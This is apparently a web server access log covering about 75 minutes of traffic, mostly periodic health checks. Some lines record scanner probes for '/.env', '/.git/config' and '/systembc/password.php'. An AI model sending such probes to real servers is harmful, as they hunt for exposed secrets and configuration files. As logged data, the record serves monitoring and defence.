167.71.120.76 - - [19/Dec/2023:11:59:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9411 "www@docker" "http://172.18.0.9:80" 1ms
57.129.23.166 - - [19/Dec/2023:12:00:17 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 9412 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [19/Dec/2023:12:00:18 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 9413 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:12:00:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9414 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:00:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9415 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:12:01:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9416 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:01:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9417 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:12:02:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9418 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:02:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9419 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:12:03:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9420 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:12:03:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9421 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:12:04:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9422 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:04:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9423 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:12:05:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9424 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:05:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9425 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:12:06:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9426 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:06:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9427 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:12:07:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9428 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:07:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9429 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:12:08:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9430 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:08:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9431 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:12:09:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9432 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:12:09:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9433 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:12:10:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9434 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:10:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9435 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:12:11:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9436 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:12:11:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9437 "www@docker" "http://172.18.0.9:80" 0ms
198.74.56.46 - - [19/Dec/2023:12:11:56 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9438 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:12:12:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9439 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:12:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9440 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:12:13:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9441 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:12:13:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9442 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:12:14:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9443 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:14:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9444 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:12:15:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9445 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:15:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9446 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:12:16:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9447 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:12:16:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9448 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:12:17:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9449 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:12:17:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9450 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:12:18:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9451 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:12:18:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9452 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [19/Dec/2023:12:18:52 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9453 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:12:19:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9454 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:19:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9455 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:12:20:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9456 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:20:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9457 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:12:21:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9458 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:21:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9459 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:12:22:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9460 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:12:22:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9461 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:12:23:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9462 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:23:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9463 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:12:24:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9464 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:24:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9465 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:12:25:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9466 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:25:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9467 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [19/Dec/2023:12:25:49 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9468 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:12:26:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9469 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:26:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9470 "www@docker" "http://172.18.0.9:80" 1ms
170.64.186.169 - - [19/Dec/2023:12:26:37 +0000] "GET /.git/config HTTP/1.1" 301 17 "-" "-" 9471 "web-to-websecure@internal" "-" 0ms
170.64.186.169 - - [19/Dec/2023:12:26:39 +0000] "GET /.git/config HTTP/1.1" 404 19 "-" "-" 9472 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:12:27:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9473 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:12:27:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9474 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:12:28:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9475 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:28:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9476 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:12:29:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9477 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:29:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9478 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:12:30:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9479 "www@docker" "http://172.18.0.9:80" 0ms
45.79.128.205 - - [19/Dec/2023:12:30:30 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9480 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:12:30:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9481 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:12:31:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9482 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:12:31:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9483 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:12:32:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9484 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:12:32:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9485 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:12:33:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9486 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:33:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9487 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:12:34:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9488 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:34:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9489 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:12:35:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9490 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:35:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9491 "www@docker" "http://172.18.0.9:80" 0ms
143.198.143.69 - - [19/Dec/2023:12:36:16 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9492 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:12:36:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9493 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:36:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9494 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:12:37:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9495 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:37:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9496 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:12:38:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9497 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:38:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9498 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:12:39:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9499 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:39:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9500 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:12:40:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9501 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:40:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9502 "www@docker" "http://172.18.0.9:80" 0ms
87.236.176.149 - - [19/Dec/2023:12:41:18 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9503 "web-to-websecure@internal" "-" 0ms
87.236.176.149 - - [19/Dec/2023:12:41:18 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9504 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:12:41:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9505 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:41:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9506 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:12:42:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9507 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:42:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9508 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:12:43:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9509 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:43:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9510 "www@docker" "http://172.18.0.9:80" 0ms
64.23.136.190 - - [19/Dec/2023:12:43:46 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9511 "web-to-websecure@internal" "-" 0ms
64.23.136.190 - - [19/Dec/2023:12:43:46 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9512 "-" "-" 0ms
64.23.136.190 - - [19/Dec/2023:12:43:46 +0000] "GET /systembc/password.php HTTP/1.1" 301 17 "-" "-" 9513 "web-to-websecure@internal" "-" 0ms
64.23.136.190 - - [19/Dec/2023:12:43:47 +0000] "GET /systembc/password.php HTTP/1.1" 404 19 "-" "-" 9514 "-" "-" 0ms
64.23.136.190 - - [19/Dec/2023:12:43:47 +0000] "GET /Ep1v HTTP/1.1" 301 17 "-" "-" 9515 "web-to-websecure@internal" "-" 0ms
64.23.136.190 - - [19/Dec/2023:12:43:47 +0000] "GET /Ep1v HTTP/1.1" 404 19 "-" "-" 9516 "-" "-" 0ms
64.23.136.190 - - [19/Dec/2023:12:43:47 +0000] "GET /GWqN HTTP/1.1" 301 17 "-" "-" 9517 "web-to-websecure@internal" "-" 0ms
64.23.136.190 - - [19/Dec/2023:12:43:48 +0000] "GET /GWqN HTTP/1.1" 404 19 "-" "-" 9518 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:12:44:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9519 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:44:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9520 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:12:45:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9521 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:45:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9522 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:12:46:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9523 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:46:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9524 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:12:47:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9525 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:47:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9526 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:12:48:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9527 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:48:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9528 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:12:49:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9529 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:49:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9530 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:12:50:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9531 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:50:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9532 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:12:51:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9533 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:12:51:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9534 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:12:52:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9535 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:52:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9536 "www@docker" "http://172.18.0.9:80" 0ms
167.94.138.127 - - [19/Dec/2023:12:52:37 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9537 "-" "-" 0ms
167.94.138.127 - - [19/Dec/2023:12:52:40 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9538 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:12:53:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9539 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:53:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9540 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:12:54:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9541 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:12:54:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9542 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:12:55:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9543 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:12:55:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9544 "www@docker" "http://172.18.0.9:80" 2ms
159.203.109.206 - - [19/Dec/2023:12:56:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9545 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:56:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9546 "www@docker" "http://172.18.0.9:80" 0ms
66.240.236.109 - - [19/Dec/2023:12:57:06 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9547 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:12:57:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9548 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:57:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9549 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:12:58:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9550 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:58:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9551 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:12:59:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9552 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:12:59:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9553 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:13:00:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9554 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:00:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9555 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:13:01:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9556 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:01:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9557 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:13:02:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9558 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:13:02:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9559 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:13:03:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9560 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:03:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9561 "www@docker" "http://172.18.0.9:80" 1ms
2.56.247.167 - - [19/Dec/2023:13:03:35 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9562 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [19/Dec/2023:13:03:36 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 9563 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [19/Dec/2023:13:03:36 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 9564 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:13:04:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9565 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:04:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9566 "www@docker" "http://172.18.0.9:80" 0ms
69.164.217.245 - - [19/Dec/2023:13:04:45 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9567 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:13:05:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9568 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:05:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9569 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:13:06:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9570 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:06:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9571 "www@docker" "http://172.18.0.9:80" 0ms
45.79.168.172 - - [19/Dec/2023:13:06:58 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9572 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:13:07:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9573 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:07:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9574 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:13:08:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9575 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:08:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9576 "www@docker" "http://172.18.0.9:80" 1ms
167.94.145.60 - - [19/Dec/2023:13:08:59 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9577 "-" "-" 0ms
167.94.145.60 - - [19/Dec/2023:13:09:02 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9578 "-" "-" 0ms
167.94.146.60 - - [19/Dec/2023:13:09:16 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9579 "web-to-websecure@internal" "-" 0ms
167.94.146.60 - - [19/Dec/2023:13:09:19 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9580 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:13:09:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9581 "www@docker" "http://172.18.0.9:80" 0ms
167.94.146.60 - - [19/Dec/2023:13:09:23 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9582 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:13:09:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9583 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:13:10:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9584 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:10:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9585 "www@docker" "http://172.18.0.9:80" 1ms
172.104.11.51 - - [19/Dec/2023:13:11:06 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9586 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:13:11:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9587 "www@docker" "http://172.18.0.9:80" 0ms
20.55.53.144 - - [19/Dec/2023:13:11:24 +0000] "GET /s6QxAn3XwezdJRr0EtLakoGCgT3 HTTP/1.1" 404 19 "-" "-" 9588 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:13:11:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9589 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [19/Dec/2023:13:12:07 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9590 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:13:12:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9591 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:12:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9592 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:13:13:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9593 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:13:13:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9594 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:13:14:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9595 "www@docker" "http://172.18.0.9:80" 0ms
